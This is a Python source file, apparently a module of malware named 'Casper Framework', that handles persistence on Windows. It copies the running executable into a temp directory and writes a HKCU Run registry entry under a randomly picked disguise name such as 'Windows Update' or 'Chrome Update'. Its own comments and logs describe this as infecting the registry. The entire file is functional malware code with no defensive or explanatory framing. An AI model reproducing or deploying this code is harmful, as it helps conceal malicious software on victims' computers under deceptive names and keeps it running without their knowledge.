"""
Part of Casper Framework
"""
from includes import *

names = ["Adobe Update","Microsoft Update","Windows Update","OneDrive Update","Acrobat Reader Plugin","Outlook Plugin","Microsoft Office Update","Google Chrome Update"]

def drop():
	"""
	Clone myself to temp directory for storage
	"""
	if (clone(sys.argv[0]) == True):
		return True
	else:
		return False

def registry():
	"""
	Add registry entry with random name
	"""
	HKEY_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
	
	try:
		HKEY_open = OpenKey(HKEY_CURRENT_USER,HKEY_key,0,KEY_ALL_ACCESS)
		SetValueEx(HKEY_open,random.choice(names),0,REG_SZ,os.path.join(temp_directory(),sys.argv[0]))
		return True
	except Exception as e:
		return False

def infect_registry():
	"""
	Infect the registry
	"""
	logging.debug("[casper] Attempting to add registry key under > Software\Microsoft\Windows\CurrentVersion\Run")
	if (registry() == True):
		logging.debug("[casper] Registry key was successfully created")

		logging.debug("[casper] Dropping the file in temp directory")
		if (drop() == True):
			logging.debug("[casper] Finished registry infection")
			return True
		else:
			logging.debug("[casper] Error while dropping file at temp directory")
	else:
		logging.debug("[casper] Error while adding registry key")
